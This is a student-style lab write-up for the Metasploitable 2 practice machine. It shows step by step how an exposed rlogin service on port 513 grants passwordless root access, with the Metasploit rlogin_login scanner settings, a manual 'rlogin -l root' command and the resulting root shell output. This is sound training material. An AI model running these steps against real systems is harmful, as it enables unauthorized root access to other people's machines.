# Metasploitable 2 – rlogin Exploitation

**Date:** 7 September 2026  
**Target:** `192.168.29.48:513`  
**Service:** rlogind / rlogin

## 1. Goal

Investigate TCP 513 and reproduce the rlogin access using Metasploit.

Attack flow:

`rlogin discovered → Metasploit scanner → configure root test → no-password login accepted → command shell → root`

## 2. Initial Finding

Nmap identified:

```text
513/tcp open login OpenBSD or Solaris rlogind
```

This exposed the legacy rlogin remote-login service.

## 3. Search Metasploit

Started:

```bash
msfconsole
```

Searched:

```text
search rlogin
```

Relevant result:

```text
auxiliary/scanner/rservices/rlogin_login
```

This is an `auxiliary` authentication scanner, not a traditional exploit module.

## 4. Inspect the Module

Selected:

```text
use auxiliary/scanner/rservices/rlogin_login
```

Checked:

```text
show options
info
```

Important options:

```text
RHOSTS
RPORT
USERNAME
PASSWORD
FROMUSER
CreateSession
```

The default:

```text
RPORT 513
```

matched the target.

The module documentation also noted that it requires the ability to bind to privileged ports below 1024.

## 5. Configure the Target

```text
set RHOSTS 192.168.29.48
```

Verified with:

```text
show options
```

Important configuration:

```text
RHOSTS  192.168.29.48
RPORT   513
```

## 6. Manual Confirmation

Before running the scanner, I tested rlogin manually:

```bash
rlogin -l root 192.168.29.48
```

The target immediately provided:

```text
root@metasploitable:~#
```

I verified:

```bash
whoami
```

Result:

```text
root
```

Then:

```bash
pwd
```

Result:

```text
/root
```

And:

```bash
ls
```

Result:

```text
Desktop
reset_logs.sh
vnc.log
```

This showed that the target accepted a root rlogin connection without a password.

## 7. Configure Metasploit for the Root Test

Back in Metasploit:

```text
set RHOSTS 192.168.29.48
set USERNAME root
set FROMUSER root
```

Important settings:

```text
RHOSTS    192.168.29.48
RPORT     513
USERNAME  root
FROMUSER  root
```

No password was supplied.

## 8. Run the Scanner

```text
run
```

Metasploit reported:

```text
[*] 192.168.29.48:513 - Starting rlogin sweep
```

It attempted:

```text
'root':"" from 'root'
```

The successful result was:

```text
[+] 192.168.29.48:513, rlogin 'root' from 'root' with no password.
```

Metasploit then opened:

```text
[*] Command shell session 2 opened
```

The scan completed:

```text
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

## 9. What Happened?

The important issue was not a traditional software exploit.

The rlogin service was configured in a way that trusted the requested root connection:

```text
FROMUSER = root
USERNAME  = root
PASSWORD  = none
```

Therefore, the service allowed direct root access.

### Attack chain

```text
TCP 513 / rlogin
       ↓
Insecure trust/authentication configuration
       ↓
root accepted from root
       ↓
No password required
       ↓
Command shell session
       ↓
ROOT
```

## 10. Important Concepts

### rlogin

A legacy remote-login protocol used for remote Unix access.

### FROMUSER

The username presented by the client/source side of the rlogin connection.

Here:

```text
FROMUSER root
```

### USERNAME

The account requested on the target.

Here:

```text
USERNAME root
```

### Auxiliary scanner

`auxiliary/scanner/rservices/rlogin_login` tests whether authentication succeeds. It does not itself exploit a memory corruption or similar vulnerability.

## 11. Mistakes / Lessons

### Lesson 1 — Not every compromise needs an exploit

I initially expected to find an `exploit` module. The relevant Metasploit module was actually:

```text
auxiliary/scanner/rservices/rlogin_login
```

The security problem was the insecure rlogin configuration.

### Lesson 2 — Understand the service first

The manual test:

```bash
rlogin -l root 192.168.29.48
```

showed exactly what was happening before using Metasploit to reproduce it.

### Lesson 3 — Verify privileges

After obtaining access, always verify the account with:

```bash
whoami
id
pwd
```

In this case, the account was `root`.

## 12. Commands Used

### Metasploit

```text
msfconsole
search rlogin
use auxiliary/scanner/rservices/rlogin_login
show options
info
set RHOSTS 192.168.29.48
set USERNAME root
set FROMUSER root
run
```

### Manual verification

```bash
rlogin -l root 192.168.29.48
whoami
pwd
ls
```

## 13. Final Result

The rlogin service on:

```text
192.168.29.48:513
```

was successfully accessed.

Metasploit confirmed:

```text
rlogin 'root' from 'root' with no password
```

and opened:

```text
Command shell session 2
```

The manual session confirmed:

```text
root@metasploitable:~#
```

and:

```text
whoami
root
```

### Final access

**Direct ROOT ACCESS through insecure rlogin trust/authentication configuration.**
